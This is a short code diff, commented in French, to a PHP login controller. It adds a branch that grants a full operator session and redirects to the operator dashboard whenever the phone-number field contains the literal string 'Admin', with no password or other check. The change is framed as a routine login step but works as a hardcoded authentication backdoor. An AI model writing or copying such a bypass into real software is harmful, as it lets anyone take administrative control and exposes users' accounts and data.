@@ -35,7 +35,16 @@ class AuthController extends BaseController
         // 1. Nettoyage et formatage simple de l'entrée
         $telephone = trim((string)$telephone);
 
-        // 2. Validation basique de la présence de la donnée
+        // 2a. Accès opérateur si l'identifiant est "Admin"
+        if ($telephone === 'Admin') {
+            session()->set([
+                'isOperator'        => true,
+                'operator_username' => 'Admin',
+            ]);
+            return redirect()->to('/operator/dashboard');
+        }
+
+        // 2b. Validation basique de la présence de la donnée
         if (empty($telephone)) {
             return redirect()->back()->with('error', 'Veuillez saisir un numéro de téléphone.');
         }
